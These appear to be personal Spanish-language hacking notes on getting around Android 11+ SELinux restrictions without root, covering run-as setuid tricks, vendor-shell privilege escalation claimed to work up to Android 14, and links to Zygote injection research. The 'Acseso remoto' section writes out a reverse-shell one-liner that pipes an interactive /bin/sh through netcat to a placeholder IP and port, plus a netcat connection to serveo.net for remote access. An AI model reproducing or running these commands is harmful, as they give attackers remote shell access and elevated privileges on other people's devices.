
# Todo a lo randor

A partir de android 11 `selinux` implementó varias restricciones, la buena noticia es que muchas de ellas se pueden 'bypassear' sin necesidad de ser root ni haciendo uso de adb xD. El mismo restringe las llamadas al sistema

SELinux sólo controla y restringe llamadas al sistema, pero un proceso puede escribir en la memoria en una dirección virtual, sin realizar una 'system call'.


El binario /system/bin/run-as tiene un permiso especial llamado setuid (o capacidades CAP_SETUID). Esto permite que, al ejecutarlo, el proceso obtenga temporalmente permisos de root para validar las condiciones

Para ver si el binario tiene capacidades asicnadas 
```
getcap /system/bin/run-as
```

**Listar paquetes saltando protexion ** 

```sh
<<(pm list packages -3 --user 0 2>&1 < /dev/null )
``` 
```
PATH=$PREFIX/bin && /system/bin/pm list packages --user 0
```


- Desde un usuario con uid2000 se  puede torgar permiso  
```
am start --user 0 -a android.settings.action.MANAGE_OVERLAY_PERMISSION -d "package:com.termux.x11"
```

- Para extraerel AndroidManifiest.xml

```
aapt dump xmltree app.apk AndroidManifest.xml
```
# Investigar <= 14
   - run-as
   - contexto vendor shell 
   - runcon

Si se logras ejecutar los binarios de ``/vendor/bin`` siendo usuario shell es posible escalar privilegios hasta el usuario ``system``. Mas informacion [aqui](https://t.me/Ivam3by_Cinderella/13/9867) 

## Investigasion  
- `vendor shell` Tiene vulnerabilidad asta android 14

### Comandos

* `ls -Z` Muestra el contexto de seguridad de Selinux
* `getenforce` Muestra el modo de seguridad de Selinux
* `setenforce` Combia temporal mente el modo 
* `/system/bin/run-as`
* 
###  Lenguaje 
- JNI

# Pendientes 
---
*Aprender*
[[-]](https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html)

[[-]](https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-m7fh-f3w4-r6v2)
--- 



**Rever shell**
[Revisar](https://t.me/Ivam3by_Cinderella/28117)
[Ejemplo](https://t.me/Ivam3by_Cinderella/13/9377)

--- 

**Acseso remoto**

```
rlwrap /system/bin/toybox nc serveo.net 65000
```

```
tali -n0 -f $TMPDIR/xD|/bin/sh -i 2>&1| nc <IP> <port> 1>$TMPDIR/xD  
```

---

-[x] **Hacer funcional** `qemu-i386`  


---


**Telegram**
https://t.me/Ivam3by_Cinderella/19953


